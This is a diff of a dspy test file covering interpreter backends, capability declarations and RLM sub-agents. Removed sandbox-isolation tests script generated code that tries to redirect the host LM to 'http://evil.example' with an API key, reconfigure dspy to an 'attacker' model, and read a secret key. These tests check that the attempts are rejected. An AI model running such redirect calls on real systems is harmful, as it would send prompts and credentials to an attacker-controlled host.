@@ -1,34 +1,28 @@
-"""Conformance tests against dspy-interpreters, the third-party CodeInterpreter backends.
+"""Conformance against dspy-interpreters, the third-party CodeInterpreter backends (a test-only
+dependency, declared in the ``dev`` dependency group).
 
-The interpreter-capability contract (``capabilities`` / ``InterpreterCapability.SUB_DSPY`` /
-``SUB_DSPY_FACTORY_NAME``) is meant to be implemented by interpreter libraries such as
-https://github.com/cmpnd-ai/dspy-interpreters (a test-only dependency, declared in the
-``dev`` dependency group). These tests pin both directions of that contract against real
-backends:
-
-* dspy side: the library's backends satisfy the ``CodeInterpreter`` protocol, a user-written
-  subclass can declare ``SUB_DSPY``, and ``dspy.RLM`` then runs real dspy sub-agents inside it.
-  The reference is a worker process: SUB_DSPY commits an interpreter to executing generated code
-  outside the host process (see ``tests/sub_dspy_interpreters.py``).
-* library side: a capability-declaring subclass still passes the library's own
-  ``check_interpreter`` conformance suite.
+Both directions of the capability contract are pinned on real backends: undeclared backends get no
+sub-agents, a subclass declaring ``InterpreterCapability.SUB_DSPY`` hosts the facade and runs bridged
+sub-agents, and the library's own consumer checks pass.
 """
 
 import pytest
 
 import dspy
-from dspy.predict.rlm import _SUB_DSPY_LM_VAR, RLM
-from dspy.primitives.code_interpreter import SUB_DSPY_FACTORY_NAME, interpreter_capabilities
+from dspy.predict.rlm import RLM
+from dspy.primitives.code_interpreter import InterpreterCapability, interpreter_capabilities
 from dspy.primitives.prediction import Prediction
 from dspy.utils.dummies import DummyLM
 
 dspy_interpreters = pytest.importorskip("dspy_interpreters")
-sub_dspy_interpreters = pytest.importorskip("tests.sub_dspy_interpreters")
 
 InProcessInterpreter = dspy_interpreters.InProcessInterpreter
 SubprocessInterpreter = dspy_interpreters.SubprocessInterpreter
-# The user story's reference: a user-written CodeInterpreter (a worker process) declaring its capabilities.
-SubDspySubprocessInterpreter = sub_dspy_interpreters.SubDspySubprocessInterpreter
+BACKENDS = ["InProcessInterpreter", "SubprocessInterpreter"]
+
+
+class FacadeSubprocessInterpreter(SubprocessInterpreter):
+    capabilities = InterpreterCapability.SUB_DSPY
 
 
 def make_scripted_predictor(responses: list[dict]):
@@ -44,7 +38,7 @@ def make_scripted_predictor(responses: list[dict]):
     return ScriptedPredictor()
 
 
-@pytest.mark.parametrize("backend_name", ["InProcessInterpreter", "SubprocessInterpreter"])
+@pytest.mark.parametrize("backend_name", BACKENDS)
 def test_backends_satisfy_protocol_and_declare_no_capabilities(backend_name):
     backend = getattr(dspy_interpreters, backend_name)
     interpreter = backend()
@@ -55,116 +49,21 @@ def test_backends_satisfy_protocol_and_declare_no_capabilities(backend_name):
     assert not interpreter_capabilities(backend)
 
 
-@pytest.mark.parametrize("backend_name", ["InProcessInterpreter", "SubprocessInterpreter"])
-def test_undeclared_backends_get_the_facade_not_native_dspy(backend_name):
-    # The capability is a declaration, not a detection.
-    backend = getattr(dspy_interpreters, backend_name)
-    rlm = RLM("query -> answer", interpreter_factory=backend)
-    instructions = rlm.generate_action.signature.instructions
-    assert "cannot cross to the host" in instructions
+@pytest.mark.parametrize("backend_name", BACKENDS)
+def test_undeclared_backends_get_no_sub_agents(backend_name):
+    rlm = RLM("query -> answer", interpreter_factory=getattr(dspy_interpreters, backend_name))
     assert rlm._sub_dspy is False
+    assert "Sub-agents (dspy)" not in rlm.generate_action.signature.instructions
 
 
-def test_capability_declaring_subclass_passes_library_conformance():
-    assert dspy.InterpreterCapability.SUB_DSPY in interpreter_capabilities(SubDspySubprocessInterpreter)
-    dspy_interpreters.check_interpreter(SubDspySubprocessInterpreter).raise_for_failures()
-    dspy_interpreters.check_rlm(SubDspySubprocessInterpreter).raise_for_failures()
+@pytest.mark.parametrize("backend_name", BACKENDS)
+def test_library_consumer_checks_pass(backend_name):
+    backend = getattr(dspy_interpreters, backend_name)
+    for check in (dspy_interpreters.check_interpreter, dspy_interpreters.check_rlm, dspy_interpreters.check_flex_facade):
+        check(backend).raise_for_failures()
 
 
-def test_subprocess_backend_runs_dspy():
-    # "Some interpreters can run dspy": a genuinely separate worker process imports dspy.
-    interpreter = SubprocessInterpreter()
-    try:
-        output = interpreter.execute("import dspy\nprint(dspy.__version__)")
-    finally:
-        interpreter.shutdown()
-    assert dspy.__version__ in str(output)
-
-
-def test_rlm_runs_dspy_sub_agents_in_capable_backend():
-    # Predict, ReActV2 with a REPL-defined tool, and a nested RLM from the provided factory.
-    rlm = RLM("query -> answer", max_iters=4, interpreter_factory=SubDspySubprocessInterpreter)
-    rlm.generate_action = make_scripted_predictor([
-        {
-            "reasoning": "Run a sub-agent",
-            "code": (
-                "import dspy\n"
-                "sub = dspy.Predict('question -> answer')\n"
-                "res = sub(question='ping')\n"
-                "print(res.answer)"
-            ),
-        },
-        {
-            "reasoning": "Run a tool-using ReActV2 sub-agent with a REPL-defined tool",
-            "code": (
-                "def lookup(query: str) -> str:\n"
-                '    """Look things up."""\n'
-                "    return f'found {query}'\n"
-                "agent = dspy.ReActV2('question -> answer', tools=[lookup])\n"
-                "agent_res = agent(question='cats')\n"
-                "print(agent_res.answer)"
-            ),
-        },
-        {
-            "reasoning": "Nested RLM gets its own interpreter, then submit",
-            "code": (
-                f"nested = dspy.RLM('q -> a', interpreter_factory={SUB_DSPY_FACTORY_NAME})\n"
-                "SUBMIT(res.answer + ' / ' + agent_res.answer)"
-            ),
-        },
-    ])
-
-    lm = DummyLM([
-        {"answer": "sub-agent says hi"},
-        {
-            "next_thought": "look it up",
-            "tool_calls": dspy.ToolCalls.from_dict_list([{"name": "lookup", "args": {"query": "cats"}}]),
-        },
-        {
-            "next_thought": "answer now",
-            "tool_calls": dspy.ToolCalls.from_dict_list([{"name": "submit", "args": {"answer": "found cats"}}]),
-        },
-    ])
-    with dspy.context(lm=lm, adapter=dspy.ChatAdapter()):
-        result = rlm(query="q")
-
-    assert result.answer == "sub-agent says hi / found cats"
-
-
-def test_factory_created_worker_recurses_natively():
-    # The provided factory declares SUB_DSPY too, so nesting stays native all the way down.
-    rlm = RLM("query -> answer", max_iters=1, interpreter_factory=SubDspySubprocessInterpreter)
-    rlm.generate_action = make_scripted_predictor([{
-        "reasoning": "Nest twice",
-        "code": (
-            f"nested = dspy.RLM('q -> a', interpreter_factory={SUB_DSPY_FACTORY_NAME})\n"
-            f"child = {SUB_DSPY_FACTORY_NAME}()\n"
-            "try:\n"
-            f"    depth2 = child.execute(\"print(callable(globals().get('{SUB_DSPY_FACTORY_NAME}')))\")\n"
-            "finally:\n"
-            "    child.shutdown()\n"
-            "SUBMIT(f'{nested._sub_dspy} {str(depth2).strip()}')"
-        ),
-    }])
-
-    assert rlm(query="q").answer == "True True"
-
-
-def test_trailing_expression_is_echoed_from_native_blocks():
-    # The per-block wrapper must not swallow the REPL echo of a trailing bare expression.
-    rlm = RLM("query -> answer", max_iters=2, interpreter_factory=SubDspySubprocessInterpreter)
-    rlm.generate_action = make_scripted_predictor([
-        {"reasoning": "REPL-style", "code": "x = 5\nx * 2"},
-        {"reasoning": "Submit", "code": "SUBMIT(str(x))"},
-    ])
-
-    result = rlm(query="q")
-
-    assert "10" in result.trajectory[0]["output"]
-    assert result.answer == "5"
-
-
-def test_facade_resolves_host_tools_bound_as_anonymous_proxies():
+def test_declaring_backend_runs_bridged_sub_agents_with_host_tools():
     # Regression: worker backends bind host tools as "<lambda>" proxies; the shim names them by global.
     calls = []
 
@@ -173,11 +72,12 @@ def test_facade_resolves_host_tools_bound_as_anonymous_proxies():
         calls.append(text)
         return text
 
-    rlm = RLM("query -> answer", max_iters=2, tools=[echo], interpreter_factory=SubprocessInterpreter)
+    rlm = RLM("query -> answer", max_iters=2, tools=[echo], interpreter_factory=FacadeSubprocessInterpreter)
     rlm.generate_action = make_scripted_predictor([
         {
             "reasoning": "Bridged ReActV2 with a host tool",
             "code": (
+                "import dspy\n"
                 "agent = dspy.ReActV2('question -> answer', tools=[echo])\n"
                 "res = agent(question='hi')\n"
                 "print(res.answer)"
@@ -200,229 +100,3 @@ def test_facade_resolves_host_tools_bound_as_anonymous_proxies():
 
     assert result.answer == "echoed hi"
     assert calls == ["hi"]
-
-
-def test_sub_agent_lm_calls_are_served_by_the_host():
-    # The sandbox sees only the model identity, never the LM's kwargs.
-    host_lm = DummyLM([{"answer": "served by host"}])
-    host_lm.kwargs["api_key"] = "sk-secret"
-    rlm = RLM("query -> answer", max_iters=2, interpreter_factory=SubDspySubprocessInterpreter)
-    rlm.generate_action = make_scripted_predictor([
-        {
-            "reasoning": "Inspect the sandbox LM, then run a sub-agent",
-            "code": (
-                "print(type(dspy.settings.lm).__name__, dspy.settings.lm.model, sorted(dspy.settings.lm.kwargs))\n"
-                "res = dspy.Predict('question -> answer')(question='ping')\n"
-                "print(res.answer)"
-            ),
-        },
-        {"reasoning": "Submit", "code": "SUBMIT(res.answer)"},
-    ])
-
-    with dspy.context(lm=host_lm, adapter=dspy.ChatAdapter()):
-        result = rlm(query="q")
-
-    inspected = result.trajectory[0]["output"]
-    assert "_DspyHostLM dummy" in inspected
-    assert "api_key" not in inspected and "sk-secret" not in inspected
-    assert result.answer == "served by host"
-    assert host_lm.history  # the call ran on the host object
-
-
-def test_sub_agent_lm_calls_count_against_max_llm_calls():
-    host_lm = DummyLM([{"answer": "one"}, {"answer": "two"}])
-    rlm = RLM("query -> answer", max_iters=2, max_llm_calls=1, interpreter_factory=SubDspySubprocessInterpreter)
-    rlm.generate_action = make_scripted_predictor([
-        {
-            "reasoning": "Two sub-agent calls",
-            "code": (
-                "sub = dspy.Predict('question -> answer')\n"
-                "first = sub(question='a').answer\n"
-                "try:\n"
-                "    sub(question='b')\n"
-                "except Exception as e:\n"
-                "    print('second call:', e)\n"
-            ),
-        },
-        {"reasoning": "Submit", "code": "SUBMIT(first)"},
-    ])
-
-    with dspy.context(lm=host_lm, adapter=dspy.ChatAdapter()):
-        result = rlm(query="q")
-
-    assert "second call:" in result.trajectory[0]["output"]
-    assert "LLM call limit exceeded: 1 + 1 > 1" in result.trajectory[0]["output"]
-    assert result.answer == "one"
-    assert len(host_lm.history) == 1
-
-
-def test_host_tools_keep_their_schema_for_native_sub_agents():
-    # Regression: a native ReActV2 would otherwise register a tool named "<lambda>" with no description.
-    calls = []
-
-    def search(query: str) -> str:
-        """Search the knowledge base."""
-        calls.append(query)
-        return f"found {query}"
-
-    rlm = RLM("query -> answer", max_iters=2, tools=[search], interpreter_factory=SubDspySubprocessInterpreter)
-    rlm.generate_action = make_scripted_predictor([
-        {
-            "reasoning": "Inspect what the sub-agent sees, then run it",
-            "code": (
-                "agent = dspy.ReActV2('question -> answer', tools=[search])\n"
-                "print(sorted(agent.tools), '|', agent.tools['search'].desc, '|', agent.tools['search'].args)\n"
-                "print(search(query='direct'))"
-            ),
-        },
-        {"reasoning": "Run it", "code": "SUBMIT(agent(question='cats').answer)"},
-    ])
-    lm = DummyLM([
-        {
-            "next_thought": "look it up",
-            "tool_calls": dspy.ToolCalls.from_dict_list([{"name": "search", "args": {"query": "cats"}}]),
-        },
-        {
-            "next_thought": "done",
-            "tool_calls": dspy.ToolCalls.from_dict_list([{"name": "submit", "args": {"answer": "found cats"}}]),
-        },
-    ])
-
-    with dspy.context(lm=lm, adapter=dspy.ChatAdapter()):
-        result = rlm(query="q")
-
-    inspected = result.trajectory[0]["output"]
-    assert "['search', 'submit'] | Search the knowledge base. | {'query': {'type': 'string'}}" in inspected
-    assert "found direct" in inspected
-    assert result.answer == "found cats"
-    assert calls == ["direct", "cats"]  # both the direct call and the sub-agent's ran on the host
-
-
-def test_explicit_sub_lm_overrides_preconfigured_environment_lm():
-    # An explicit sub_lm wins over an LM the environment already configured, matching llm_query.
-    interpreter = SubDspySubprocessInterpreter()
-    try:
-        interpreter.execute(
-            "import dspy\n"
-            "dspy.configure(lm=dspy.LM('openai/env-default'))"
-        )
-        rlm = RLM(
-            "query -> answer",
-            max_iters=1,
-            interpreter_factory=SubDspySubprocessInterpreter,
-            sub_lm=dspy.LM("openai/sub-override", cache=False),
-        )
-        rlm.generate_action = make_scripted_predictor([
-            {"reasoning": "Report the configured LM", "code": "SUBMIT(dspy.settings.lm.model)"},
-        ])
-        result = rlm(interpreter, query="q")
-        restored = interpreter.execute("print(dspy.settings.lm.model)")
-    finally:
-        interpreter.shutdown()
-
-    assert result.answer == "openai/sub-override"
-    assert "openai/env-default" in str(restored)
-
-
-def test_default_sub_lm_matches_llm_query_precedence():
-    # The override is scoped per block, so the environment's own LM survives the call.
-    interpreter = SubDspySubprocessInterpreter()
-    try:
-        interpreter.execute(
-            "import dspy\n"
-            "dspy.configure(lm=dspy.LM('openai/env-default'))"
-        )
-        dspy.configure(lm=dspy.LM("openai/host-default", cache=False))
-        rlm = RLM("query -> answer", max_iters=1, interpreter_factory=SubDspySubprocessInterpreter)
-        rlm.generate_action = make_scripted_predictor([
-            {"reasoning": "Report the configured LM", "code": "SUBMIT(dspy.settings.lm.model)"},
-        ])
-        result = rlm(interpreter, query="q")
-        restored = interpreter.execute("print(dspy.settings.lm.model)")
-    finally:
-        interpreter.shutdown()
-
-    assert result.answer == "openai/host-default"
-    assert "openai/env-default" in str(restored)
-
-
-def test_generated_code_cannot_redirect_the_sub_agent_lm_of_later_blocks():
-    # Each block re-ships the LM identity, so corrupting it in one block cannot affect the next.
-    rlm = RLM(
-        "query -> answer",
-        max_iters=2,
-        interpreter_factory=SubDspySubprocessInterpreter,
-        sub_lm=dspy.LM("openai/sub-explicit", cache=False),
-    )
-    rlm.generate_action = make_scripted_predictor([
-        {
-            "reasoning": "Corrupt the shipped LM info",
-            "code": f"{_SUB_DSPY_LM_VAR} = {{'model': 'openai/generated-replacement', 'model_type': 'chat'}}",
-        },
-        {"reasoning": "Report the active LM", "code": "SUBMIT(dspy.settings.lm.model)"},
-    ])
-
-    assert rlm(query="q").answer == "openai/sub-explicit"
-
-
-def test_generated_code_configuring_dspy_reaches_only_the_worker():
-    dspy.configure(lm=dspy.LM("openai/host-original", cache=False))
-    rlm = RLM("query -> answer", max_iters=1, interpreter_factory=SubDspySubprocessInterpreter)
-    rlm.generate_action = make_scripted_predictor([
-        {"reasoning": "Reconfigure dspy", "code": "dspy.configure(lm=dspy.LM('openai/attacker'))\nSUBMIT('42')"},
-    ])
-
-    assert rlm(query="q").answer == "42"
-    assert dspy.settings.lm.model == "openai/host-original"
-
-
-def test_sub_agents_cannot_set_host_lm_routing_or_credentials():
-    host_lm = DummyLM([{"answer": "unused"}])
-    rlm = RLM("query -> answer", max_iters=2, interpreter_factory=SubDspySubprocessInterpreter)
-    rlm.generate_action = make_scripted_predictor([
-        {
-            "reasoning": "Try to redirect the host LM",
-            "code": (
-                "try:\n"
-                "    dspy.settings.lm(messages=[{'role': 'user', 'content': 'hi'}], api_base='http://evil.example', api_key='sk-x')\n"
-                "except Exception as e:\n"
-                "    print('rejected:', e)\n"
-            ),
-        },
-        {"reasoning": "Submit", "code": "SUBMIT('done')"},
-    ])
-
-    with dspy.context(lm=host_lm):
-        result = rlm(query="q")
-
-    assert "rejected:" in result.trajectory[0]["output"]
-    assert "may not set LM option(s) ['api_base', 'api_key']" in result.trajectory[0]["output"]
-    assert host_lm.history == []
-
-
-def test_nested_rlm_calls_draw_on_the_top_level_budget():
-    # A nested RLM generates its actions on the host-served LM, so recursion is bounded by the top-level budget.
-    host_lm = DummyLM([{"answer": "one"}, {"reasoning": "never reached", "code": "SUBMIT('x')"}])
-    rlm = RLM("query -> answer", max_iters=2, max_llm_calls=1, interpreter_factory=SubDspySubprocessInterpreter)
-    rlm.generate_action = make_scripted_predictor([
-        {
-            "reasoning": "Spend the budget, then recurse",
-            "code": (
-                "first = dspy.Predict('question -> answer')(question='a').answer\n"
-                f"nested = dspy.RLM('q -> a', max_iters=1, interpreter_factory={SUB_DSPY_FACTORY_NAME})\n"
-                "try:\n"
-                "    nested(q='b')\n"
-                "except Exception as e:\n"
-                "    print('nested:', e)\n"
-            ),
-        },
-        {"reasoning": "Submit", "code": "SUBMIT(first)"},
-    ])
-
-    with dspy.context(lm=host_lm, adapter=dspy.ChatAdapter()):
-        result = rlm(query="q")
-
-    assert "nested:" in result.trajectory[0]["output"]
-    assert "LLM call limit exceeded: 1 + 1 > 1" in result.trajectory[0]["output"]
-    assert result.answer == "one"
-    assert len(host_lm.history) == 1
